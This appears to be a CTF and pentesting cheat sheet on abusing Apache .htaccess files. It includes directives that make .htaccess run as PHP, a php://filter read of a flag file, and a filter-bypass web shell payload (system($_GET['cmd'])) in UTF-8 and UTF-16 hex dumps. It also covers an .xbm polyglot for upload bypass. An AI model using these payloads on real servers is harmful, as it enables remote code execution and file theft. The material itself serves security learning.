
# Apache Configuration using .htaccess

`.htaccess` files are used to configure a web directory and its sub-directories.
_.htaccess files provide a way to make configuration changes on a per directory basis._
# .htaccess

If `AllowOverride` is set to `All` in the main configuration, then malicious `.htaccess` will be interpreted as legit configuration files.

**Directory index**

```bash
DirectoryIndex home.html
```

**Rewrite URLs** :
With the **mod_rewrite** module of the Apache HTTP Web server preinstalled on your Web Hosting plan, you can use this feature to redirect:

- All HTTP requests to a single file on your website.
- A portion of HTTP requests to a single file on your website.
- Your domain name to its www subdomain.
- Requests to a particular folder, without displaying the folder concerned.
- Website requests to HTTPS when a URL was opened in HTTP.

https://help.ovhcloud.com/csm/en-web-hosting-htaccess-url-rewriting?id=kb_article_view&sysparm_article=KB0052861

**Redirect error messages**
```bash
ErrorDocument Error_Code_Number Message_Or_Destination
```

**Authorize reading**
```.htaccess
<Files ".htaccess">
    Require all granted
</Files>
```

**Redirect requests**
```
Options +FollowSymLinks
RewriteEngine On
RewriteRule ^folder1.*$ https://mydomain.com/folder2/ [R=301,L]
```

**Redirect requests**
```
# Convert http://exemple.com/blabla/blabla to http://exemple.com/private/flag.txt/blabla/blabla
Redirect 301 / /private/flag.txt

# Convert http://exemple.com/blabla/blabla to http://google.com/private/flag.txt/blabla/blabla
Redirect 301 / http://google.com
```

**Interpreting as PHP**
```bash
# Load module
LoadModule php5_module        modules/mod_php55.so

# It means that all files with an extension .custom will execute php
AddType application/x-httpd-php .custom .html .htm
AddType application/x-httpd-php5 .htaccess

# Interpret the .htaccess file as php
AddType application/x-httpd-php .htaccess

# If running php as cgi
AddHandler application/x-httpd-php .htaccess 
```
***/!\\ DO NOT FORGOT TO CHANGE CONTENT-TYPE IN BURP***
```
Content-Type: application/x-httpd-php
```

**Some more PHP config**
```bash
php_value zend.multibyte 1      # Active specific encoding (you will see why after :D)
php_value zend.detect_unicode 1  # Detect if the file have unicode content
php_value display_errors 1        # Display php errors
```

**Bypass .htaccess by using unknown verb**
- Works only on very old versions
```bash
curl -X AAAA http://exemple.com/flag.txt
```

**Auto Append file**
```bash
php_value auto_append_file "php://filter/convert.base64-encode/resource=/private/flag.txt"
```

# Modules

You can test if a module is loading using the following condition
- If the .htaccess is readable, the module is present, otherwise module is not present
```bash
<IfModule mod_mime.c>
    <Files ~ "^\.ht">
        Require all granted
        Order allow,deny
        Allow from all
    </Files>
</IfModule>
```
**Modules :**
- `mod_rewrite.c` used to rewrite URLs
- `mod_mime.c` used to change the mime type of different file extension (e.g. interpret .html as php)
- `mod_alias.c` create directory and file aliases
- `mod_auth_basic.c` offers basic authentication

# Bypass filters

**PHP** supports several form of encoding. 
Default is UTF-8 but PHP understand UTF-16 as well.
- In UTF-8 chars are encoded on 1 byte
- In UTF-16 chars are encoded on 2 bytes
For example, it helps bypassing `<?php` filter

**UTF-8** payload
```php
00000000: 3c3f 7068 7020 7379 7374 656d 2824 5f47  <?php system($_G
00000010: 4554 5b27 636d 6427 5d29 3b20 6469 6528  ET['cmd']); die(
00000020: 293b 203f 3e0a                           ); ?>.
```
**UTF-16** payload (Big-endian to avoid some PHP bugs)
```php
00000000: 003c 003f 0070 0068 0070 0020 0073 0079  .<.?.p.h.p. .s.y
00000010: 0073 0074 0065 006d 0028 0024 005f 0047  .s.t.e.m.(.$._.G
00000020: 0045 0054 005b 0027 0063 006d 0064 0027  .E.T.[.'.c.m.d.'
00000030: 005d 0029 003b 0020 0064 0069 0065 0028  .].).;. .d.i.e.(
00000040: 0029 003b 0020 003f 003e 0a              .).;. .?.>.
```

# Polyglot

> _“In computing, a polyglot is a computer program or script written in a valid form of multiple programming languages, which performs the same operations or output independent of the programming language used to compile or interpret it.”_

Ref : [http://php.net/manual/en/function.exif-imagetype.php](http://php.net/manual/en/function.exif-imagetype.php)

`.xbm` format is interesting because 
- it is interpreted as an image
- the first two lines define height and width ans start with `#`
- So, headers will not disturb our `.htaccess`

**`.xbm` example**
```bash
#define test_width 16
#define test_height 7
static char test_bits[] = {
0x13, 0x00, 0x15, 0x00, 0x93, 0xcd, 0x55, 0xa5, 0x93, 0xc5, 0x00, 0x80, 0x00, 0x60 };
```




# Resources
- http://corb3nik.github.io/blog/insomnihack-teaser-2019/l33t-hoster
- https://github.com/wireghoul/htshells/blob/master/traversal/mod_hitlog.traversal.htaccess
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess/
- https://httpd.apache.org/docs/2.2/fr/howto/htaccess.html
- https://swisskyrepo.github.io/PayloadsAllTheThings/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess/
- http://archive.justanotherhacker.com/2011/05/htaccess-based-attacks.html
- https://blog.qualys.com/vulnerabilities-threat-research/2015/10/22/unrestricted-file-upload-vulnerability
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp
- https://corz.org/server/tricks/htaccess.php
- [https://httpd.apache.org/docs/2.4/en/howto/htaccess.html](https://httpd.apache.org/docs/2.4/en/howto/htaccess.html)